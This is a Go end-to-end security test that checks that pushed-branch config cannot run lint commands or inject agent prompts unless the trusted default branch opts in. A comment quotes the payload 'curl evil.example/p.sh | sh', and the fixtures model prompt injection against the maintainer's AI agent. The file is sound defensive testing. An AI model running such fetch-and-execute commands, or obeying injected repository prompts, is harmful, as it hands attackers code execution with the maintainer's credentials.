//go:build e2e

package e2e

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/kunchenguid/no-mistakes/internal/types"
)

// hostilePromptMarker is the pushed-branch prompts payload. It must never
// appear in any agent prompt unless the trusted default branch opted in via
// allow_repo_commands: prompts steer the agent processes launched with the
// maintainer's credentials, so they follow the same trust boundary as
// commands and agent.
const hostilePromptMarker = "NM-E2E-HOSTILE-PROMPT-MARKER"

// TestRepoConfigCommandsFromDefaultBranch proves the supply-chain RCE fix
// (audit finding #1): the code-executing fields commands.* are loaded from the
// trusted default-branch copy of .no-mistakes.yaml, never from a contributor's
// pushed SHA. A feature branch ships a malicious lint command that writes a
// marker file; under the secure default the marker must never appear, while an
// explicit allow_repo_commands opt-in must run it — so the assertion is known
// to be meaningful rather than testing a no-op. The same pushed config also
// carries a hostile prompts.shared addition; the fake-agent prompt capture
// proves it never reaches an agent prompt under the secure default and does
// reach one under the opt-in.
func TestRepoConfigCommandsFromDefaultBranch(t *testing.T) {
	t.Run("blocked_by_default", func(t *testing.T) {
		optOut := false
		h := NewHarness(t, SetupOpts{Agent: "claude", Scenario: cleanReviewScenario(t), AllowRepoCommands: &optOut})

		if out, err := h.Run("init"); err != nil {
			t.Fatalf("nm init: %v\n%s", err, out)
		}

		markerPath := pushMaliciousRepoConfig(t, h, "rce-blocked")

		run := h.WaitForRun("rce-blocked", 90*time.Second)
		if run.Status != types.RunCompleted {
			t.Fatalf("run did not complete: status=%s error=%v", run.Status, deref(run.Error))
		}

		if _, err := os.Stat(markerPath); err == nil {
			t.Fatalf("SECURITY REGRESSION: pushed-branch lint command executed (marker %s exists); commands.* must be loaded from the trusted default branch, not the pushed SHA", markerPath)
		}

		// Sanity: the lint step ran (it delegated to the agent because the
		// trusted default branch has no lint command) and reached a terminal
		// status, so the absence of the marker is a real result rather than a
		// pipeline that never got to lint.
		lintStep, ok := findStep(run.Steps, types.StepLint)
		if !ok {
			t.Fatalf("lint step missing from run results")
		}
		switch lintStep.Status {
		case types.StepStatusCompleted, types.StepStatusSkipped, types.StepStatusFailed:
		default:
			t.Fatalf("lint step did not reach a terminal status: %s", lintStep.Status)
		}

		assertNoAgentPromptContainsHostileMarker(t, h)
	})

	t.Run("executes_when_opted_in", func(t *testing.T) {
		// Same attack payload, but the maintainer has explicitly opted in via
		// allow_repo_commands. The pushed-branch command MUST run, proving the
		// marker check above is a meaningful guard against regressions.
		optIn := true
		h := NewHarness(t, SetupOpts{Agent: "claude", Scenario: cleanReviewScenario(t), AllowRepoCommands: &optIn})

		if out, err := h.Run("init"); err != nil {
			t.Fatalf("nm init: %v\n%s", err, out)
		}

		markerPath := pushMaliciousRepoConfig(t, h, "rce-optin")

		run := h.WaitForRun("rce-optin", 90*time.Second)
		// The opt-in run may complete or fail depending on later steps; either
		// way the lint payload must have executed. Guard with a clear message.
		if _, err := os.Stat(markerPath); err != nil {
			t.Fatalf("opt-in run should have executed the pushed-branch lint command (marker %s missing); run status=%s err=%v", markerPath, run.Status, deref(run.Error))
		}

		// The pushed-branch prompts must reach the agent under the opt-in,
		// proving the no-marker assertion in blocked_by_default is a
		// meaningful guard rather than testing a prompt that never renders.
		found := false
		for _, inv := range h.AgentInvocations() {
			if strings.Contains(inv.Prompt, hostilePromptMarker) {
				found = true
				break
			}
		}
		if !found {
			t.Fatalf("opt-in run should have appended the pushed-branch prompts to an agent prompt (marker %q missing from all invocations); run status=%s err=%v", hostilePromptMarker, run.Status, deref(run.Error))
		}
	})

	t.Run("pushed_branch_cannot_self_enable", func(t *testing.T) {
		// Hard requirement of the per-repo move: allow_repo_commands is read
		// ONLY from the trusted default-branch copy, never the pushed SHA. A
		// contributor who sets allow_repo_commands: true on their feature
		// branch alongside a hostile command MUST NOT self-enable — the
		// trusted default branch says false, so the command is dropped.
		optOut := false
		h := NewHarness(t, SetupOpts{Agent: "claude", Scenario: cleanReviewScenario(t), AllowRepoCommands: &optOut})

		if out, err := h.Run("init"); err != nil {
			t.Fatalf("nm init: %v\n%s", err, out)
		}

		markerPath := filepath.Join(t.TempDir(), "pwned")
		branch := "rce-self-enable"
		h.CommitChange(branch, branch+".txt", "change to gate\n", "add "+branch+" change")
		// The contributor tries to flip the opt-in on AND ship a hostile
		// command plus hostile prompts in the same pushed copy. All must be
		// ignored: the trusted default-branch copy controls the switch.
		selfEnableConfig := fmt.Sprintf("ignore_patterns:\n  - 'vendor/**'\nallow_repo_commands: true\ncommands:\n  lint: \"echo pwned > %s\"\nprompts:\n  shared: \"%s\"\n", markerPath, hostilePromptMarker)
		h.CommitChange(branch, ".no-mistakes.yaml", selfEnableConfig, "self-enable + malicious lint")
		h.PushToGate(branch)

		run := h.WaitForRun(branch, 90*time.Second)
		if run.Status != types.RunCompleted {
			t.Fatalf("run did not complete: status=%s error=%v", run.Status, deref(run.Error))
		}

		if _, err := os.Stat(markerPath); err == nil {
			t.Fatalf("SECURITY REGRESSION: pushed-branch allow_repo_commands self-enabled and ran the lint command (marker %s exists); the opt-in must be read from the trusted default branch, not the pushed SHA", markerPath)
		}

		assertNoAgentPromptContainsHostileMarker(t, h)
	})
}

// assertNoAgentPromptContainsHostileMarker fails when any recorded fake-agent
// invocation carries the pushed-branch prompts payload, and guards against a
// vacuous pass by requiring that the run invoked the agent at all.
func assertNoAgentPromptContainsHostileMarker(t *testing.T, h *Harness) {
	t.Helper()
	invs := h.AgentInvocations()
	if len(invs) == 0 {
		t.Fatalf("no agent invocations recorded; cannot prove pushed-branch prompts were excluded")
	}
	for _, inv := range invs {
		if strings.Contains(inv.Prompt, hostilePromptMarker) {
			t.Fatalf("SECURITY REGRESSION: pushed-branch prompts reached an agent prompt (marker %q found); prompts must be loaded from the trusted default branch, not the pushed SHA\nagent=%s args=%v", hostilePromptMarker, inv.Agent, inv.Args)
		}
	}
}

// pushMaliciousRepoConfig creates a feature branch carrying a hostile
// .no-mistakes.yaml whose lint command writes a marker file and whose
// prompts.shared carries an injection marker, pushes it through the gate, and
// returns the lint marker path the test should assert on. The default-branch
// .no-mistakes.yaml (written by the harness) carries no commands or prompts,
// so it is the trusted source and yields empty commands and prompts under the
// secure default.
func pushMaliciousRepoConfig(t *testing.T, h *Harness, branch string) string {
	t.Helper()
	markerPath := filepath.Join(t.TempDir(), "pwned")

	// A real change so rebase has a non-empty diff.
	h.CommitChange(branch, branch+".txt", "change to gate\n", "add "+branch+" change")

	// The malicious payload: in the wild this would be
	// "curl evil.example/p.sh | sh". Here it writes a marker the test can see.
	// The prompts payload models a contributor steering the maintainer's agent
	// from a pushed branch.
	maliciousConfig := fmt.Sprintf("ignore_patterns:\n  - 'vendor/**'\ncommands:\n  lint: \"echo pwned > %s\"\nprompts:\n  shared: \"%s\"\n", markerPath, hostilePromptMarker)
	h.CommitChange(branch, ".no-mistakes.yaml", maliciousConfig, "configure malicious lint command")

	h.PushToGate(branch)
	return markerPath
}
